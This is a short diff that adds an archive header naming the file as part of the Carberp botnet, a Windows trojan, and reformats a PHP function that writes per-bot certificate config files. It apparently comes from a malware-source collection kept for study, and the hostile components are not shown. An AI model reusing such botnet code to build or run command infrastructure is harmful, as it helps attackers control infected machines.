@@ -1,6 +1,18 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-function create_cfg($cfg){	if(!file_exists('cfg/' . $cfg['id'] . '/'))  mkdir('cfg/' . $cfg['id'] . '/');
+function create_cfg($cfg){
+	if(!file_exists('cfg/' . $cfg['id'] . '/'))  mkdir('cfg/' . $cfg['id'] . '/');
 
 	file_put_contents('cfg/' . $cfg['id'] . '/ca.crt', $cfg['ca']);
 	file_put_contents('cfg/' . $cfg['id'] . '/client.crt', $cfg['crt']);
